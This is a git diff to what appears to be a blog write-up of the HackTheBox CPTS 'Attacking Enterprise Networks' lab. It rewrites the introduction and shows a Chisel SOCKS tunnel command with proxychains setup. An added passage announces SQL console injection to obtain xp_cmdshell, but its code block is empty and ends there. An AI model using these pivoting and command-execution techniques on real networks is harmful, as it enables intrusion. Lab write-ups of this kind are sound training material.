@@ -4,7 +4,7 @@ date: 2025-03-14 00:00:01 +0800
 categories: [HTBAcademy]
 tags: [CPTS]
 ---
-Attacking Enterprise Networks is the final module for the HackTheBox Certified Penetration Tester Specialist career pathway. It attempts to combine all of the concepts that the student has learned from all of the previous modules and best emulates the 10-day penetration test examination expected to be taken after completing said modules. Other security professionals state that an effective way to prepare for the examination is to attempt this module blind as a black-box penetration test, only working off of the given domain name and ip address to find all of the flags in the simulated Active Directory domain. 
+Attacking Enterprise Networks is the final module for the HackTheBox Certified Penetration Tester Specialist career pathway. It combines all of the concepts from previous modules and best emulates the 10-day black-box penetration test expected to be taken as an exam after completing said modules. It is best advised to attack this module blind as preparation for the exam. 
 
 ### First Flag:
 
@@ -497,3 +497,7 @@ TheControlDevil@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
 2022/05/05 14:21:19 client: tun: SSH connected
 ```
 We also make sure that we have socks5 127.0.0.1 1080 in our /etc/proxychains.conf file since 1080 is the default proxychains port that will connect to the Chisel tunnel. After this, we do proxychains firefox 172.16.8.20 again and see that we have no lag connecting to the website and entering in our credentials after upgrading our pure SSH tunnel to a Chisel tunnel. 
+
+First thing that was interesting to me was the SQL console. We try to inject the following commands to get a xp_commandshell:
+```
+
